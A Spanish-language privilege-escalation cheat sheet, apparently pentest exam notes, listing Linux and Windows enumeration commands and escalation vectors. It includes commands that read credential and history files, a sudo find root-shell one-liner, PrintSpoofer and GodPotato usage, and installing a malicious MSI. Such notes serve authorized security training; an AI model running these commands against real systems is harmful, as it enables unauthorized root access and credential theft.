# 5. Escalada de Privilegios (Linux & Windows)

Tras conseguir shell: estabiliza TTY, **captura `local.txt`**, y lo PRIMERO es `sudo -l` (Linux) / `whoami /priv` (Windows).

## Scripts automatizados
- **Linux:** LinPEAS → `./linpeas.sh | tee linpeas.out`
- **Windows:** WinPEAS → `winPEASany.exe`
- **Linux (procesos):** `pspy64` para ver cron/tareas en tiempo real

---

## LINUX

### Comprobaciones manuales rápidas
```bash
id; sudo -l                          # ¡SIEMPRE primero!
uname -a; cat /etc/os-release        # kernel (última opción)
find / -perm -4000 -type f 2>/dev/null   # binarios SUID
getcap -r / 2>/dev/null              # capabilities
crontab -l; cat /etc/crontab; ls -la /etc/cron.*   # cron
ps aux                               # procesos como root
cat /etc/passwd
find / -name "*.txt" 2>/dev/null; cat ~/.bash_history
netstat -tulnp                       # servicios internos → pivoting
```

### Vectores clásicos
- **`sudo -l` con NOPASSWD** → busca el binario en **GTFOBins** para escapar a root.
- **SUID inusual** → GTFOBins.
- **Capability** `cap_setuid`, etc. → GTFOBins.
- **Cron** editable o con wildcard/PATH manipulable.
- **Credenciales** en configs, `.bash_history`, `/var/www`, DBs, `.ssh`.
- **Reutilización de contraseñas** (misma pass de la web → SSH root).
- **Kernel exploit** (PwnKit/CVE-2021-4034, DirtyPipe) → **último recurso**, verifica versión exacta.

```bash
# Ejemplo GTFOBins: sudo find
sudo find . -exec /bin/sh \; -quit
```

---

## WINDOWS

### Comprobaciones manuales rápidas
```cmd
whoami /priv                 :: ¡privilegios! busca SeImpersonate / SeAssignPrimaryToken
whoami /groups
systeminfo                   :: hotfixes y versión de OS
net user & net localgroup administrators
cmdkey /list                 :: credenciales guardadas
wmic service get name,displayname,pathname,startmode
```
```cmd
:: AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Vectores clásicos
- **SeImpersonatePrivilege** (cuentas de servicio, IIS, MSSQL) → **PrintSpoofer** o **GodPotato**:
  ```cmd
  PrintSpoofer.exe -i -c cmd
  GodPotato.exe -cmd "cmd /c whoami"
  ```
- **Unquoted service path** con espacios y carpeta escribible → colocar binario malicioso.
- **Permisos débiles en el binario/servicio** → reemplazarlo y reiniciar el servicio.
- **AlwaysInstallElevated** (ambas claves = 1) → instalar `.msi` malicioso:
  ```cmd
  msiexec /quiet /qn /i evil.msi
  ```
- **Credenciales** en registro, `unattend.xml`, `web.config`, scripts.
- **Kernel exploit** según `systeminfo` → último recurso (usa Windows Exploit Suggester).
